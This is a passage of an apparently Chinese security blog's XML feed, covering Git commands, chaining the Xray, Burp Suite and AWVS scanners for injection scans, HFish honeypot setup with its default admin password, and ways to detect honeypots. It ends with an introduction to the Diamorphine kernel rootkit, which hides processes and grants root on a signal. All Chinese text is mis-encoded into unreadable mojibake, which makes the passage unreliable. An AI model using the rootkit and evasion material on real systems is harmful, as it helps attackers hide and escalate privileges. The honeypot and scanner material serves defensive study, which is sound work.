class="line">developï¼šå¦‚æœéœ€è¦å¼€å‘æ–°çš„åŠŸèƒ½ï¼Œä¼šå…ˆåœ¨è¿™ä¸ªåˆ†æ”¯ä¸Šè¿›è¡Œå¼€å‘æµ‹è¯•ï¼Œå¼€å‘æµ‹è¯•å®Œæˆä¹‹åéœ€è¦åˆ‡å›masteråˆ†æ”¯è¿›è¡Œåˆå¹¶</span><br><span class="line"><span class="comment">// --------------------------------------</span></span><br><span class="line">git checkout -b developï¼šåˆ›å»ºdevelopåˆ†æ”¯ï¼Œå¹¶æ¥åˆ°developåˆ†æ”¯</span><br><span class="line">git branchï¼šæŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯</span><br><span class="line">git checkout masterï¼šåˆ‡å›masteråˆ†æ”¯</span><br><span class="line">git merge developï¼šåœ¨masteråˆ†æ”¯ä¸Šåˆå¹¶developåˆ†æ”¯</span><br></pre></td></tr></table></figure><h2 id="7ã€æœ¬åœ°ä»“åº“æäº¤åˆ°è¿œç¨‹ä»“åº“"><a href="#7ã€æœ¬åœ°ä»“åº“æäº¤åˆ°è¿œç¨‹ä»“åº“" class="headerlink" title="7ã€æœ¬åœ°ä»“åº“æäº¤åˆ°è¿œç¨‹ä»“åº“"></a><strong>7ã€æœ¬åœ°ä»“åº“æäº¤åˆ°è¿œç¨‹ä»“åº“</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1ã€æŒ‡å®šæäº¤åˆ°çš„ä»“åº“åœ°å€(http)</span></span><br><span class="line">git remote add origin &lt;ä»“åº“åœ°å€å¦‚ï¼šhttps:<span class="comment">//gitee.com/lusensec/test.git&gt;</span></span><br><span class="line"><span class="comment">// 2ã€æŒ‡å®šæäº¤åˆ°çš„ä»“åº“åœ°å€(ssh)</span></span><br><span class="line">git remote set-url origin git@github.com:Lusensec/Comprehensive_Growth_Toolbox.git</span><br><span class="line"><span class="comment">// error: remote origin already exists. è¡¨ç¤ºå·²ç»ç»‘å®šè¿‡æ­¤ä»“åº“åœ°å€äº†</span></span><br><span class="line"><span class="comment">// å¯ä»¥ä¿®æ”¹æ–°çš„ä»“åº“åœ°å€ï¼šgit remote set-url origin æ–°çš„ä»“åº“URLæˆ–sshæäº¤åœ°å€ï¼ˆgit@github.com:Lusensec/Comprehensive_Growth_Toolbox.gitï¼‰</span></span><br><span class="line"><span class="comment">// ä¹Ÿå¯ä»¥æ·»åŠ ä¸€ä¸ªæ–°çš„ä»“åº“åœ°å€ï¼šgit remote add upstream æ–°çš„ä»“åº“URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2ã€æŒ‡å®špush çš„åˆ†æ”¯</span></span><br><span class="line">git push -u origin <span class="string">&quot;master&quot;</span></span><br><span class="line"><span class="comment">// åç»­æ¨é€ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</span></span><br><span class="line">git push -u origin <span class="string">&quot;master&quot;</span></span><br><span class="line"><span class="comment">// é»˜è®¤masterï¼Œè¿˜æœ‰mainã€developç­‰è‡ªå®šä¹‰åˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3ã€å¼ºåˆ¶è¦†ç›–å¼çš„æ¨é€</span></span><br><span class="line">git push -u origin <span class="string">&quot;master&quot;</span> --force</span><br><span class="line"><span class="comment">// 4ã€æŸ¥çœ‹æ­¤æ—¶gitå¯¹è¿œç¨‹ä»“åº“çš„é…ç½®</span></span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure><h1 id="äº”ã€æ€»ç»“"><a href="#äº”ã€æ€»ç»“" class="headerlink" title="äº”ã€æ€»ç»“"></a>äº”ã€æ€»ç»“</h1><p>Git æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œè€Œ GitHubã€Giteeã€GitLab å’ŒGitCode  æ˜¯åˆ©ç”¨ Git æä¾›ä»£ç æ‰˜ç®¡æœåŠ¡çš„å¹³å°ã€‚</p><p>GitHub æ˜¯å…¨çƒæœ€è‘—åçš„ Git ä»£ç æ‰˜ç®¡å¹³å°ä¹‹ä¸€ï¼Œæä¾›äº†å…¬æœ‰å’Œç§æœ‰ä»“åº“ï¼Œä»¥åŠä¸°å¯Œçš„ç¤¾åŒºåŠŸèƒ½ï¼Œå¦‚é—®é¢˜è·Ÿè¸ªã€æ‹‰å–è¯·æ±‚ã€Fork å’Œ Star ç­‰ã€‚</p><p>GitLab æä¾›äº†ç¤¾åŒºç‰ˆï¼ˆGitLab CEï¼‰å’Œä¼ä¸šç‰ˆï¼ˆGitLab EEï¼‰ã€‚GitLab CE æ˜¯å…è´¹çš„å¼€æºè½¯ä»¶ï¼Œå¯ä»¥è‡ªè¡Œæ­å»ºå’Œéƒ¨ç½²ã€‚</p><p>Gitee ä½œä¸ºå›½å†…å¹³å°ï¼Œæä¾›äº†å…è´¹çš„ç§æœ‰ä»“åº“æœåŠ¡ï¼Œå¹¶ä¸”å¯¹äºå›½å†…ç”¨æˆ·æ¥è¯´ï¼Œè®¿é—®é€Ÿåº¦æ›´å¿«ã€‚</p><p>GitCode ä¸ºå›½å†…ç”¨æˆ·æä¾›äº†ä¸€äº›ç‰¹æ®Šçš„ä¿éšœï¼Œæ–¹ä¾¿å›½å†…ç”¨æˆ·è®¿é—®ï¼ŒåŒæ—¶ï¼Œå¯ä»¥åŒæ­¥GitHubé¡¹ç›®é•œåƒï¼Œå¯ä¸GitHubç»“åˆä½¿ç”¨ã€‚</p><p>é€‰æ‹©å“ªä¸ªå¹³å°é€šå¸¸å–å†³äºä¸ªäººæˆ–å›¢é˜Ÿçš„éœ€æ±‚ã€é¢„ç®—ä»¥åŠå¯¹ç¤¾åŒºå’Œç½‘ç»œé€Ÿåº¦ç­‰å¤šæ–¹é¢çš„è€ƒè™‘ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´æ‰«æå™¨ã€‘Xray+BP+AWVSæ‰«æå™¨è”åŠ¨æ¼æ´æŒ–æ˜</title>
      <link href="/2024/02/21/VulnScan-AW-BP-xray/"/>
      <url>/2024/02/21/VulnScan-AW-BP-xray/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€æ¼æ´æ‰«æå™¨ã€‘Xray-BP-AWVSæ‰«æå™¨è”åŠ¨æ¼æ´æŒ–æ˜"><a href="#ã€æ¼æ´æ‰«æå™¨ã€‘Xray-BP-AWVSæ‰«æå™¨è”åŠ¨æ¼æ´æŒ–æ˜" class="headerlink" title="ã€æ¼æ´æ‰«æå™¨ã€‘Xray+BP+AWVSæ‰«æå™¨è”åŠ¨æ¼æ´æŒ–æ˜"></a>ã€æ¼æ´æ‰«æå™¨ã€‘Xray+BP+AWVSæ‰«æå™¨è”åŠ¨æ¼æ´æŒ–æ˜</h1><h1 id="ä¸€ã€Xrayçš„ä½¿ç”¨"><a href="#ä¸€ã€Xrayçš„ä½¿ç”¨" class="headerlink" title="ä¸€ã€Xrayçš„ä½¿ç”¨"></a>ä¸€ã€Xrayçš„ä½¿ç”¨</h1><h3 id="1ã€å‘½ä»¤è¡Œç‰ˆçš„ä½¿ç”¨"><a href="#1ã€å‘½ä»¤è¡Œç‰ˆçš„ä½¿ç”¨" class="headerlink" title="1ã€å‘½ä»¤è¡Œç‰ˆçš„ä½¿ç”¨"></a>1ã€å‘½ä»¤è¡Œç‰ˆçš„ä½¿ç”¨</h3><p>å…ˆåŒå‡»è¿›å…¥xrayå‘½ä»¤è¡Œç‰ˆçš„ç›®å½•ä¸‹</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240220175746355.png" alt="image-20240220175746355"></p><p>å†æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1ã€ä¸»åŠ¨æ‰«æï¼šå•ä¸ªurlæ‰«æ</span><br><span class="line">xray_windows_amd64.exe webscan --url &quot;http://example.com/?a=b&quot;</span><br><span class="line">2ã€è¢«åŠ¨æ‰«æï¼šä½¿ç”¨httpä»£ç†è¿›è¡Œæ‰«æï¼ˆéœ€è¦åœ¨æµè§ˆå™¨é…ç½®7777çš„ä»£ç†ï¼‰</span><br><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br><span class="line">3ã€æŒ‡å®šæ¨¡å—æ‰«æï¼ˆå‘½ä»¤æ‰§è¡Œå’ŒSQLæ³¨å…¥æ¨¡å—ï¼‰ï¼š</span><br><span class="line">xray_windows_amd64.exe webscan --plugins cmd_injection,sqldet --url http://test.com</span><br><span class="line">xray_windows_amd64.exe webscan --plugins cmd_injection,sqldet --proxy 127.0.0.1:7777</span><br></pre></td></tr></table></figure><h3 id="2ã€GUI-Xrayç‰ˆä½¿ç”¨"><a href="#2ã€GUI-Xrayç‰ˆä½¿ç”¨" class="headerlink" title="2ã€GUI-Xrayç‰ˆä½¿ç”¨"></a>2ã€GUI-Xrayç‰ˆä½¿ç”¨</h3><p><img src="/img/VulnScan-AW-BP-xray/image-20240220180859676.png" alt="image-20240220180859676"></p><p>è¢«åŠ¨æ‰«æä¸éœ€è¦æŒ‡å®šurl ç›®æ ‡ï¼Œä½†æ˜¯éœ€è¦åœ¨æµè§ˆå™¨é…ç½®xray è¢«åŠ¨ç›‘å¬çš„ä»£ç†</p><h1 id="äºŒã€Xray-å’Œ-BPè”åŠ¨"><a href="#äºŒã€Xray-å’Œ-BPè”åŠ¨" class="headerlink" title="äºŒã€Xray å’Œ BPè”åŠ¨"></a>äºŒã€Xray å’Œ BPè”åŠ¨</h1><p>1ã€Xray å¼€å¯è¢«åŠ¨ç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>2ã€BPè®¾ç½®ä¸Šæ¸¸ä»£ç†æœåŠ¡å™¨åˆ°xray è¢«åŠ¨ç›‘å¬ç«¯å£</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240220180108500.png" alt="image-20240220180108500"></p><p>3ã€ä¹‹ååœ¨æµè§ˆå™¨é…ç½®BP çš„ä»£ç†å³å¯</p><h1 id="ä¸‰ã€Xray-AWVS-è”åŠ¨"><a href="#ä¸‰ã€Xray-AWVS-è”åŠ¨" class="headerlink" title="ä¸‰ã€Xray+AWVS è”åŠ¨"></a>ä¸‰ã€Xray+AWVS è”åŠ¨</h1><p>åœ¨AWVSé…ç½®å¥½è¢«åŠ¨ç›‘å¬çš„xray å³å¯ï¼Œæ³¨æ„ä¿å­˜åæ‰«æ</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240221144043219.png" alt="image-20240221144043219"></p><h1 id="å››ã€Xray-BP-AWVS-è”åŠ¨"><a href="#å››ã€Xray-BP-AWVS-è”åŠ¨" class="headerlink" title="å››ã€Xray+BP+AWVS è”åŠ¨"></a>å››ã€Xray+BP+AWVS è”åŠ¨</h1><p>1ã€å…ˆé…ç½®å¥½Xray + BP è”åŠ¨</p><p>2ã€é…ç½®AWVSï¼ˆè®°å¾—åœ¨AWVSå³ä¸Šæ–¹å…ˆä¿å­˜å†æ‰«æï¼‰</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240221142756519.png" alt="image-20240221142756519"></p><p>3ã€å¼€å§‹æ‰«æï¼Œæ‰«æä¿¡æ¯ä¼šä¿å­˜è‡³AWVS å’Œ xray çš„è¾“å‡ºæ–‡ä»¶ä¸­</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240221144845892.png" alt="image-20240221144845892"></p><p>4ã€æ‰«æå‡ºæ¥å°†è¿‘ä¸¤ç™¾æ¡æ¼æ´ç›¸å…³ä¿¡æ¯</p><p><img src="/img/VulnScan-AW-BP-xray/image-20240221150637136.png" alt="image-20240221150637136"></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æ‰«æå™¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æ‰«æå™¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€èœœç½ã€‘HFishèœœç½çš„æ­å»ºå’Œä½¿ç”¨</title>
      <link href="/2024/02/19/Blue-Team-Honeypot-Defense-Hfish/"/>
      <url>/2024/02/19/Blue-Team-Honeypot-Defense-Hfish/</url>
      
        <content type="html"><![CDATA[<h1 id="HFishèœœç½çš„æ­å»ºå’Œä½¿ç”¨"><a href="#HFishèœœç½çš„æ­å»ºå’Œä½¿ç”¨" class="headerlink" title="HFishèœœç½çš„æ­å»ºå’Œä½¿ç”¨"></a>HFishèœœç½çš„æ­å»ºå’Œä½¿ç”¨</h1><h1 id="ä¸€ã€èœœç½ä»‹ç»"><a href="#ä¸€ã€èœœç½ä»‹ç»" class="headerlink" title="ä¸€ã€èœœç½ä»‹ç»"></a>ä¸€ã€èœœç½ä»‹ç»</h1><p>èœœç½æ ¹æ®èƒ½åŠ›åˆ†ä¸ºï¼šä½äº¤äº’èœœç½ã€ä¸­äº¤äº’èœœç½ã€é«˜äº¤äº’èœœç½ã€‚æ˜¯ä¸€ç§æ”¹å˜ç½‘ç»œå®‰å…¨é˜²å¾¡è¢«åŠ¨å±€é¢çš„ä¸€ç§ä¸»åŠ¨é˜²å¾¡æŠ€æœ¯ï¼Œç°å·²æˆä¸ºç›‘æµ‹ã€åˆ†æç½‘ç»œå¨èƒçš„ä¸»è¦æŠ€æœ¯æ‰‹æ®µï¼Œå¹¶é€æ¸æ¼”è¿›ä¸ºä½“ç³»åŒ–çš„ç½‘ç»œä¸»åŠ¨é˜²å¾¡æ¶æ„ç½‘ç»œæ¬ºéª—ã€‚é€šè¿‡ä¸ç§»åŠ¨ç›®æ ‡é˜²å¾¡ç­‰é˜²å¾¡æŠ€æœ¯ç»“åˆï¼Œå®Œå…¨æœ‰å¯èƒ½åˆ›é€ å‡ºæ›´åŠ å®‰å…¨é«˜æ•ˆçš„ä¸»åŠ¨é˜²å¾¡ä½“ç³»ï¼Œåœ¨ç½‘ç»œå®‰å…¨é˜²å¾¡ä¸­å‘æŒ¥æ›´å¤§ä½œç”¨ã€‚</p><p>å›½å®¶ä¿å¯†ç§‘æŠ€æµ‹è¯„ä¸­å¿ƒï¼š<a href="https://www.gjbmj.gov.cn/n1/2021/1224/c411145-32316186.html">https://www.gjbmj.gov.cn/n1/2021/1224/c411145-32316186.html</a></p><h1 id="äºŒã€HFish-èœœç½"><a href="#äºŒã€HFish-èœœç½" class="headerlink" title="äºŒã€HFish èœœç½"></a>äºŒã€HFish èœœç½</h1><p>å®˜ç½‘ï¼š<a href="https://hfish.net/">https://hfish.net/</a></p><p>æä¾›Windowsã€LinuxåŠDcoker ä¸‹è½½ã€‚æ˜¯ä¸€æ¬¾ç¤¾åŒºå‹å…è´¹èœœç½ï¼Œä¸ºç”¨æˆ·æä¾›å¯ç‹¬ç«‹æ“ä½œä¸”å®ç”¨å¯é çš„ä¸­ä½äº¤äº’èœœç½ã€‚ç”¨æˆ·éœ€è¦å…ˆéƒ¨ç½²ç®¡ç†ç«¯ï¼Œå†é€šè¿‡ç®¡ç†ç«¯å†…ç½®èœœç½èŠ‚ç‚¹æˆ–éƒ¨ç½²æ–°èŠ‚ç‚¹ã€‚</p><h1 id="ä¸‰ã€èœœç½éƒ¨ç½²"><a href="#ä¸‰ã€èœœç½éƒ¨ç½²" class="headerlink" title="ä¸‰ã€èœœç½éƒ¨ç½²"></a>ä¸‰ã€èœœç½éƒ¨ç½²</h1><h3 id="1ã€éƒ¨ç½²ç¯å¢ƒ"><a href="#1ã€éƒ¨ç½²ç¯å¢ƒ" class="headerlink" title="1ã€éƒ¨ç½²ç¯å¢ƒ"></a>1ã€éƒ¨ç½²ç¯å¢ƒ</h3><p>æˆ‘ä»¬ä»¥HFish èœœç½ä¸ºä¾‹ï¼Œæ¥è¿›è¡Œéƒ¨ç½²</p><p>éƒ¨ç½²ç¯å¢ƒï¼š</p><ol><li>Centos7 çš„Linux ç³»ç»Ÿ</li><li>é‡‡ç”¨çº¿ä¸‹éƒ¨ç½²æ–¹å¼ï¼ˆæ–¹ä¾¿å†…ç½‘ç¯å¢ƒï¼‰</li></ol><h3 id="2ã€çº¿ä¸‹éƒ¨ç½²"><a href="#2ã€çº¿ä¸‹éƒ¨ç½²" class="headerlink" title="2ã€çº¿ä¸‹éƒ¨ç½²"></a>2ã€çº¿ä¸‹éƒ¨ç½²</h3><p>linux éƒ¨ç½²å¸®åŠ©æ–‡æ¡£ï¼š<a href="https://hfish.net/#/2-2-linux">Linuxä¸‹è½½éƒ¨ç½² (hfish.net)</a></p><p>1ã€ä¸‹è½½å®‰è£…åŒ…</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219134431019.png" alt="image-20240219134431019"></p><p>2ã€åœ¨Centos7ä¸­è§£å‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf hfish-3.3.4-linux-amd64.tgz </span><br></pre></td></tr></table></figure><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219135101119.png" alt="image-20240219135101119"></p><p>3ã€ç¡®ä¿4433ã€4434ç«¯å£å¼€æ”¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo firewall-cmd --add-port=4433/tcp --permanent   ï¼ˆç”¨äºwebç•Œé¢å¯åŠ¨ï¼‰</span><br><span class="line">sudo firewall-cmd --add-port=4434/tcp --permanent   ï¼ˆç”¨äºèŠ‚ç‚¹ä¸ç®¡ç†ç«¯é€šä¿¡ï¼‰</span><br><span class="line">sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>4ã€æ‰§è¡Œinstall.shè„šæœ¬</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219135155606.png" alt="image-20240219135155606"></p><p>5ã€ç™»é™†webé¡µé¢è¿›è¡Œèœœç½è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç™»é™†é“¾æ¥ï¼šhttps://[ip]:4433/web/</span><br><span class="line">è´¦å·ï¼šadmin</span><br><span class="line">å¯†ç ï¼šHFish2021</span><br></pre></td></tr></table></figure><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219140420136.png" alt="image-20240219140420136"></p><p>ä¹‹åé…ç½®å¥½æ•°æ®åº“ç¨ç­‰ç‰‡åˆ»å³å¯ç™»é™†é¦–é¡µ</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219142216264.png" alt="image-20240219142216264"></p><h3 id="3ã€éƒ¨ç½²èŠ‚ç‚¹"><a href="#3ã€éƒ¨ç½²èŠ‚ç‚¹" class="headerlink" title="3ã€éƒ¨ç½²èŠ‚ç‚¹"></a>3ã€éƒ¨ç½²èŠ‚ç‚¹</h3><p>èŠ‚ç‚¹ç®¡ç†å¤„å±•å¼€èŠ‚ç‚¹ä¹‹åå³å¯æ·»åŠ èŠ‚ç‚¹</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219140841909.png" alt="image-20240219140841909"></p><p>æ·»åŠ å…·å¤‡è¯±æƒ‘åŠ›çš„èŠ‚ç‚¹ï¼Œå¯ä»¥è‡ªå·±ä»»æ„é€‰æ‹©</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219140938613.png" alt="image-20240219140938613"></p><h3 id="4ã€æŸ¥çœ‹æ•è·ä¿¡æ¯"><a href="#4ã€æŸ¥çœ‹æ•è·ä¿¡æ¯" class="headerlink" title="4ã€æŸ¥çœ‹æ•è·ä¿¡æ¯"></a>4ã€æŸ¥çœ‹æ•è·ä¿¡æ¯</h3><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219141424862.png" alt="image-20240219141424862"></p><p>å¯æŸ¥çœ‹æ”»å‡»è€…çš„æ•°æ®åŒ…ä¿¡æ¯</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219141746115.png" alt="image-20240219141746115"></p><p>åœ¨å¤§å±å®æ—¶æ•è·æ”»å‡»ä¿¡æ¯</p><p><img src="/img/Blue-Team-Honeypot-Defense-Hfish/image-20240219141555311.png" alt="image-20240219141555311"></p><h1 id="å››ã€èœœç½è¯†åˆ«"><a href="#å››ã€èœœç½è¯†åˆ«" class="headerlink" title="å››ã€èœœç½è¯†åˆ«"></a>å››ã€èœœç½è¯†åˆ«</h1><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.freebuf.com/articles/network/236485.html">æ”»é˜²æ¼”ç»ƒä¸­çº¢é˜Ÿå¦‚ä½•è¯†åˆ«èœœç½ä¿æŠ¤è‡ªå·± - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><ol><li><strong>ç«¯å£å¼€æ”¾æƒ…å†µ</strong>ï¼šèœœç½é€šå¸¸ä¼šå¼€æ”¾å¤§é‡ç«¯å£ï¼Œå°¤å…¶æ˜¯é‚£äº›å¸¸ç”¨äºæœåŠ¡çš„ç«¯å£ã€‚å¦‚æœä¸€ä¸ªç³»ç»Ÿå¼€æ”¾äº†å¼‚å¸¸å¤šçš„ç«¯å£ï¼Œå°¤å…¶æ˜¯é‚£äº›ä¸å¸¸è§çš„ç«¯å£ï¼Œè¿™å¯èƒ½æ˜¯èœœç½çš„è¿¹è±¡ã€‚</li><li><strong>å“åº”ç‰¹å¾</strong>ï¼šèœœç½åœ¨æ¨¡æ‹Ÿå„ç§åè®®æ—¶ï¼Œå¯èƒ½ä¼šåœ¨å“åº”ä¸­å¸¦æœ‰ä¸€äº›æ˜æ˜¾çš„ç‰¹å¾ã€‚ä¾‹å¦‚ï¼ŒæŸäº›èœœç½åœ¨å®ç°ç‰¹å®šåè®®æ—¶ï¼Œå¯èƒ½ä¼šä½¿ç”¨å›ºå®šçš„å‚æ•°æˆ–è€…å“åº”æ¨¡å¼ã€‚</li><li><strong>åè®®å®ç°çš„ç¼ºé™·</strong>ï¼šéƒ¨åˆ†èœœç½åœ¨æ¨¡æ‹Ÿåè®®æ—¶å¯èƒ½å­˜åœ¨ä¸å®Œå–„çš„åœ°æ–¹ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹å®šçš„è¯·æ±‚åŒ…æ¥æ£€æµ‹è¿™äº›ç¼ºé™·ï¼Œä»è€Œè¯†åˆ«å‡ºèœœç½ã€‚</li><li><strong>WEBæœåŠ¡ç‰¹å¾</strong>ï¼šèœœç½æä¾›çš„WEBæœåŠ¡ä¸­å¯èƒ½ä¼šåŒ…å«ç‰¹å®šçš„æ–‡ä»¶ã€è„šæœ¬æˆ–è€…ç‰ˆæœ¬å·ç­‰ï¼Œè¿™äº›ç‰¹å¾å¯ä»¥ç”¨æ¥è¯†åˆ«èœœç½ã€‚ä¾‹å¦‚ï¼ŒæŸäº›èœœç½å¯èƒ½ä¼šåœ¨é¡µé¢ä¸­åµŒå…¥ç‰¹å®šçš„JavaScriptæ–‡ä»¶æˆ–è€…æ˜¾ç¤ºç‰¹å®šçš„é”™è¯¯ä¿¡æ¯ã€‚</li><li><strong>ä¸Šä¸‹æ–‡ç‰¹å¾</strong>ï¼šèœœç½åœ¨æ‰§è¡Œå‘½ä»¤æ—¶å¯èƒ½ä¼šè¡¨ç°å‡ºä¸Šä¸‹æ–‡çš„å¼‚å¸¸ï¼Œå¦‚å›ºå®šä¸å˜çš„è¾“å‡ºæˆ–è€…å¼‚å¸¸çš„è¿›ç¨‹å¯åŠ¨æ—¶é—´ã€‚</li><li><strong>Fuzz testingç‰¹å¾</strong>ï¼šä¸€äº›èœœç½é‡‡ç”¨æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzz testingï¼‰çš„æ€æƒ³ï¼Œå¯¹ä»»æ„ç«¯å£çš„TCP SYN Packetè¿›è¡Œå“åº”ï¼Œæˆ–è€…æ ¹æ®åè®®ç‰¹å¾æ°¸è¿œè¿”å›æ­£ç¡®çš„å“åº”ã€‚</li><li><strong>è™šæ‹Ÿæœºç‰¹å¾</strong>ï¼šèœœç½å¯èƒ½ä¼šéƒ¨ç½²åœ¨è™šæ‹Ÿæœºä¸Šï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ£€æŸ¥MACåœ°å€èŒƒå›´ã€è™šæ‹Ÿæœºç‰¹æœ‰çš„æ–‡ä»¶ç³»ç»Ÿå’Œæ³¨å†Œè¡¨ä¿¡æ¯ç­‰æ¥è¯†åˆ«è™šæ‹Ÿæœºã€‚</li><li><strong>ç½‘ç»œæµé‡åˆ†æ</strong>ï¼šèœœç½é€šå¸¸ä¼šé™åˆ¶ç³»ç»Ÿå‘å¤–çš„æµé‡ï¼Œæˆ–è€…åœ¨åŒä¸€ä¸ªç½‘æ®µå†…éƒ¨ç½²å¤šä¸ªèœœç½ï¼Œè¿™å¯ä»¥é€šè¿‡ç½‘ç»œæµé‡åˆ†æå·¥å…·å¦‚Nmapã€Shodanæˆ–Censysæ¥è¯†åˆ«ã€‚</li><li><strong>ASNåˆ†å¸ƒ</strong>ï¼šèœœç½å¯èƒ½ä¼šéƒ¨ç½²åœ¨ç‰¹å®šçš„IPåœ°å€èŒƒå›´å†…ï¼Œè¿™äº›åœ°å€å¯èƒ½å±äºç‰¹å®šçš„ç½‘ç»œæœåŠ¡æä¾›å•†ï¼ˆISPï¼‰ï¼Œå°¤å…¶æ˜¯äº‘æœåŠ¡æä¾›å•†ã€‚</li><li><strong>è®¾å¤‡æŒ‡çº¹</strong>ï¼šèœœç½å¯èƒ½ä¼šåœ¨WEBé¡µé¢ä¸­åµŒå…¥å¤§é‡è®¾å¤‡æŒ‡çº¹ä¿¡æ¯ï¼Œå¦‚Serverã€Titleå­—æ®µï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥ç”¨æ¥è¯†åˆ«èœœç½ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> è“é˜Ÿåº”æ€¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> èœœç½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è¿›ç¨‹éšè—ã€‘Linuxéšè—å·¥å…·â€”Diamorphine</title>
      <link href="/2024/02/18/Red-Team-Linux-Hiding-Diamorphine/"/>
      <url>/2024/02/18/Red-Team-Linux-Hiding-Diamorphine/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€è¿›ç¨‹éšè—ã€‘Linuxéšè—å·¥å…·â€”Diamorphine"><a href="#ã€è¿›ç¨‹éšè—ã€‘Linuxéšè—å·¥å…·â€”Diamorphine" class="headerlink" title="ã€è¿›ç¨‹éšè—ã€‘Linuxéšè—å·¥å…·â€”Diamorphine"></a>ã€è¿›ç¨‹éšè—ã€‘Linuxéšè—å·¥å…·â€”Diamorphine</h1><h2 id="é›¶ã€Diamorphine-ä»‹ç»"><a href="#é›¶ã€Diamorphine-ä»‹ç»" class="headerlink" title="é›¶ã€Diamorphine ä»‹ç»"></a>é›¶ã€Diamorphine ä»‹ç»</h2><p>Diamorphine æ˜¯ä¸€ä¸ªLinuxå†…æ ¸æ¨¡å—ï¼Œ æ”¯æŒå†…æ ¸ç‰ˆæœ¬ 2.6.x&#x2F;3.x&#x2F;4.xã€‚å¯é€šè¿‡ uname -r æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å½“åŠ è½½çš„æ—¶å€™ï¼Œ æ¨¡å—æ˜¯ä¸å¯è§çš„ï¼ˆlsmod çœ‹ä¸åˆ°ï¼‰ï¼›</span><br><span class="line">é€šè¿‡å‘é€31ä¿¡å·ï¼Œå¯ä»¥è¾¾åˆ°éšè—å’Œä¸éšè—è¿›ç¨‹çš„ç›®çš„ï¼› </span><br><span class="line">é€šè¿‡å‘é€63ä¿¡å·ï¼Œå¯ä»¥éšè—å’Œä¸éšè—è¯¥å†…æ ¸æ¨¡å—ï¼› </span><br><span class="line">é€šè¿‡å‘é€64ä¿¡å·ï¼ˆç»™ä»»ä½•è¿›ç¨‹ï¼‰ï¼Œå¯ä»¥å°†ç”¨æˆ·å˜æˆrootï¼› </span><br><span class="line">å¦‚æœæ–‡ä»¶æˆ–è€…ç›®å½•ä»¥MAGIC_PREFIXå¼€å§‹ï¼Œå°†ä¼šéšè—ï¼› </span><br></pre></td></tr></table></figure><p>é¡¹ç›®åœ°å€ï¼š <a href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a></p><h2 